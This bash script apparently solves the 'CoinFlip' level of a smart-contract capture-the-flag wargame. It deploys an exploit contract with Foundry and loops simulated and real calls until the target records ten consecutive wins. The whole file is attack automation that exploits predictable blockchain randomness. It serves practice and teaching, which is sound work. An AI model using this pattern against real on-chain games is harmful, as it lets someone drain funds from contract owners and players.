#!/usr/bin/env bash
CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

echo "Deploying exploit"
EXPLOIT_ADDRESS=$(forge create --private-key $PRIVATE_KEY src/Level03Exploit.sol:CoinFlipExploit \
	| grep "Deployed to:" \
	| awk '{print $3}')

WINS=0
while [ ${WINS} -lt 10 ]
do
	cast call --private-key ${PRIVATE_KEY} \
		${EXPLOIT_ADDRESS} \
		$(cast calldata 'exploit(address)' ${CONTRACT}) >/dev/null 2>&1

	if [ $? -ne 0 ]
	then
		sleep 5
		echo "waiting for next block"
		continue
	fi

	echo "Flipping..."
	cast send --private-key ${PRIVATE_KEY} \
		${EXPLOIT_ADDRESS} \
		$(cast calldata 'exploit(address)' ${CONTRACT}) >/dev/null

	WINS=$(cast call ${CONTRACT} "$(cast sig 'consecutiveWins()(uint256)')" | cast to-dec)
	echo "Consecutive wins: ${WINS}"
done

echo "Level completed, submit instance"
